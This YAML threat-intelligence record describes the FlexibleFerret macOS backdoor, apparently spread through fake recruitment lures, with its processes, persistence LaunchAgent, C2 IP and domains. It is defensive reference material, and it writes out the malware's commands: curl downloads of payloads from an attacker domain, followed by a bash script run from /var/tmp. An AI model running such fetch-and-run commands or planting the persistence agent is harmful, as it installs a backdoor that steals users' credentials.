description: "FlexibleFerret uses fake recruitment lures to deliver a multi\u2011\
  stage macOS backdoor that stages a shell script, downloads architecture\u2011specific\
  \ payloads, installs a LaunchAgent for persistence and exfiltrates credentials via\
  \ Dropbox."
attribution: DPRK-aligned operators
malware_families:
- FlexibleFerret
TTPs:
  processes:
  - macpatch.sh
  - drivfixer.sh
  - MediaPatcher.app
  commandline:
  - curl -s -o /var/tmp/CDrivers.zip https://app.zynoracreative.com/updrv8/drv-Arm64.patch
  - curl -s -o /var/tmp/CDrivers.zip https://app.zynoracreative.com/updrv8/drv-Intel.patch
  - /bin/bash /var/tmp/macpatch.sh
  powershell: []
  scripting_engine:
  - '#!/bin/bash'
  - '#!/bin/bash'
  registry_keys: []
  image_load: []
  network_connections:
  - process: macpatch.sh
    destination: app.zynoracreative.com
    port: 443
  - process: drivfixer.sh
    destination: 95.169.180.140
    port: 8080
  file_activity:
  - /var/tmp/macpatch.sh
  - /var/tmp/CDrivers.zip
  - /var/tmp/CDrivers/drivfixer.sh
  - ~/Library/LaunchAgents/com.driver9990as7tpatch.plist
  - /var/tmp/CDrivers/MediaPatcher.app
  persistence:
  - LaunchAgent com.driver9990as7tpatch.plist
  process_relations:
  - macpatch.sh -> drivfixer.sh
IOCs:
  hashes: []
  ips:
  - 95.169.180.140
  domains:
  - app.zynoracreative.com
  - evaluza.com
  - proficiencycert.com
  urls:
  - https://app.zynoracreate.../updrv8/drv-Arm64.patch
  - https://app.zynoracreate.../updrv8/drv-Intel.patch
authors:
- Ferdous Saljooki
